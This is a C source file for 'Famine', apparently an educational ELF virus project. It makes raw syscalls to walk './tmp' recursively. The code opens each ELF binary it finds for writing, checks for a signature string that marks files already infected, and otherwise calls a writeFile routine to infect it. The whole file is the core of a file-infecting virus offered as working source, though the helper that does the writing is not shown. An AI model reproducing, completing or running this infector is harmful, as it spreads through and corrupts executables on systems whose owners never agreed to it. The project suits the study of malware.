#include "virus.h"

void virus(char *file) {
    struct ELFheaders64 fHdr;
    int bytes_rd;
    int fd;
    const char signature[] = "Famine version 1.0 (c)oded by <pgoudet>-<Mastermind pgoudet>";

    fd = (int)ft_syscall(OPEN, (void *)file, (void *)2, 0, 0);
    if (fd < 0)
        return ;
    bytes_rd = (int)ft_syscall(READ, (void *)fd, (void *)&fHdr, (void *)0x40, 0);
    if (bytes_rd < 0x40 || check_file(fHdr) != 0)
        return;

    if (checkSignature(fd, signature) == 1) {
        ft_syscall(CLOSE, (void *)fd, 0, 0, 0);
        return;
    }
    writeFile(fd, fHdr);
    ft_syscall(CLOSE, (void *)fd, 0, 0, 0);
}

int famine(char *target_dir) {
    int fd = 1;
    int options_openat = 0 | 2048 | 65536;
    struct linux_dirent {
            unsigned long  d_ino;
            unsigned long  d_off;
            unsigned short d_reclen;
            char           d_name[1024];
    } dir;
    int bytes_rode;
    char full_path[0x1000];
   
    fd = (int)ft_syscall(OPENAT, (void *)-100, (void *)target_dir, (void *)options_openat, (void *)0);
    if (fd == -1)
        return(1);
    do {
        bytes_rode = (int)ft_syscall(GETDENTS, (void *)fd, (void *)&dir, (void *)0x1000, (void *)0);
        for (int bpos = 0; bpos < bytes_rode;) {
            struct linux_dirent *d = (struct linux_dirent *)((char *)&dir + bpos);
            if (ft_strcmp(d->d_name, ".") != 0 && ft_strcmp(d->d_name, "..") != 0)  {
                unsigned long int len = ft_strlen(target_dir);
                memncat(full_path, 0, target_dir, len);
                ft_strcat(full_path, "/");
                ft_strcat(full_path, d->d_name);
                if (isDir(full_path) == 1)
                    famine(full_path);
                else
                    virus(full_path);
                ft_memset(full_path, 0 , 0x1000);
            }
            bpos += d->d_reclen;
        }
    }
    while (bytes_rode > 0);
    return (0);
}

int _start() {
    char *target_dir = "./tmp";
    
    famine(target_dir);
    ft_syscall(EXIT, 0, 0, 0, 0);
}

